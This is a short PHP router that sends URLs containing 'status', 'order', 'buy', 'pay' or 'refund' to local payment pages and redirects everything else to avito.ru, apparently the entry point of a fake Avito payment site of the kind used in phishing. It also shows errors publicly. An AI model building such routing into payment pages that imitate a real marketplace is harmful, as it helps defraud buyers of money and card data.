<?php 

	ob_start();
	
	ini_set('error_reporting', E_ALL);
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	
	require_once $_SERVER['DOCUMENT_ROOT'].'/system/mysql.php';
	require_once $_SERVER['DOCUMENT_ROOT'].'/system/config.php';
	
	if(strpos($_SERVER['REQUEST_URI'], 'status')) {
		require_once $_SERVER['DOCUMENT_ROOT'] . '/status.php';
	} elseif(strpos($_SERVER['REQUEST_URI'], 'order')) {
		require_once $_SERVER['DOCUMENT_ROOT'] . '/payment.php';
	} elseif(strpos($_SERVER['REQUEST_URI'], 'buy')) {
		require_once $_SERVER['DOCUMENT_ROOT'] . '/order.php';
	} elseif(strpos($_SERVER['REQUEST_URI'], 'pay')) {
		require_once $_SERVER['DOCUMENT_ROOT'] . '/pay.php';
	} elseif(strpos($_SERVER['REQUEST_URI'], 'refund')) {
		require_once $_SERVER['DOCUMENT_ROOT'] . '/refund.php';
	} else {
		header("Location: https://avito.ru/");
	}

?>